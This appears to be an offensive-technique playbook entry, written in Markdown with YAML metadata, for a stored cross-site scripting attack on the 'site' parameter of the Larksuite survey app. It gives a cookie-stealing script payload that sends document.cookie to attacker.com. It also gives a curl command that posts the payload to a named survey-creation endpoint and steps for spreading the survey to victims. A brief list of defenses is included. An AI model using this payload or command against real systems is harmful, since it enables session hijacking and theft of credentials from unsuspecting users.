---
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:37.533Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 09a1c08b-4182-4a4d-a9fe-cb826621aa9c
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-Larksuite-Survey-Site-Parameter

## Summary

This procedure exploits insufficient input sanitization in the Larksuite survey app's 'site' parameter to inject and store malicious JavaScript, which persists and executes when other users view the survey, enabling client-side attacks like data theft.

## Description

In the Larksuite survey app, the 'site' parameter accepts user input without proper escaping, allowing stored XSS. An attacker with survey creation access crafts a request to embed JavaScript (e.g., for cookie exfiltration) that renders in the survey page for all viewers. This targets organization members, leading to medium-impact issues like session hijacking. Prerequisites include authenticated access to the API or web interface.

## Requirements

1. Authenticated Larksuite account with survey creation permissions
2. Knowledge of the survey creation endpoint (e.g., via API docs or inspection)
3. Attacker-controlled domain for exfiltration (e.g., to receive stolen cookies)

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding for user-controlled parameters like 'site'
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous network requests from survey pages to external domains

## Objectives

1. Store malicious JavaScript persistently in the survey
2. Ensure payload evades basic filtering
3. Prepare for execution on victim access

## Instructions

### Step 1: Craft the Payload

**Context**: Design a JavaScript payload that executes on page load, such as exfiltrating cookies to an attacker server.

No command needed; example payload: `<script>fetch('http://attacker.com/steal?data=' + encodeURIComponent(document.cookie));</script>`.

### Step 2: Submit via API

**Context**: Use curl to POST the payload to the survey creation endpoint, bypassing any client-side checks.

**Command** ([[commands/curl-inject-xss-payload]]):
```bash
curl -X POST 'https://larksuite.com/api/survey/create' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
  -d '{"title": "Test Survey", "site": "<script>fetch(\'http://attacker.com/steal?data=\' + encodeURIComponent(document.cookie));</script>"}'
```

> This sends the JSON payload with the malicious 'site' value. Expected output: JSON response with survey ID, e.g., {"id": "survey123", "status": "created"}. Verify storage by fetching the survey and inspecting the 'site' field.

### Step 3: Share the Survey

**Context**: Distribute the survey link to trigger views by targets.

No command; obtain the survey URL from the creation response and share via organization channels.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss-payload]]

## Tools Used


## Tags

- xss
- stored-xss
- larksuite
